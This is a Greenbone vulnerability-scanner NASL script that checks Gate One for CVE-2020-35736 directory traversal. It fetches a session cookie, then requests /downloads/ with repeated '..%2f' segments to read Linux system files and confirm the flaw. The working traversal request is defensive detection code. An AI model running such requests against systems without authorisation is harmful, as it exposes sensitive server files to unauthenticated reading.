# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:liftoffsoftware:gateone";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146035");
  script_version("2021-06-02T13:45:42+0000");
  script_tag(name:"last_modification", value:"2021-06-03 10:25:40 +0000 (Thu, 03 Jun 2021)");
  script_tag(name:"creation_date", value:"2021-05-28 07:02:46 +0000 (Fri, 28 May 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2020-35736");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Gate One Directory Traversal Vulnerability (Dec 2020)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_gate_one_http_detect.nasl");
  script_mandatory_keys("liftoffsoftware/gateone/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Gate One is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Gate One allows arbitrary file download without authentication
  via /downloads/.. directory traversal because os.path.join is misused.");

  script_tag(name:"affected", value:"Gate One 1.2 and prior.");

  script_tag(name:"solution", value:"No known solution is available as of 28th May, 2021.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/liftoff/GateOne/issues/747");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

# nb: Don't use http_get_cache() as we need a current cookie
req = http_get(port: port, item: "/auth?next=%2F");
res = http_keepalive_send_recv(port: port, data: req);

if ("gateone_user" >!< res)
  exit(0);

cookie = http_get_cookie_from_header(buf: res, pattern: "(gateone_user=[^;]+)");
if (isnull(cookie))
  exit(0);

foreach pattern (keys(files)) {
  url = "/downloads/" + crap(length: 5 * 9, data: "..%2f") + files[pattern];

  if (http_vuln_check(port: port, url: url, pattern: pattern, cookie: cookie, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
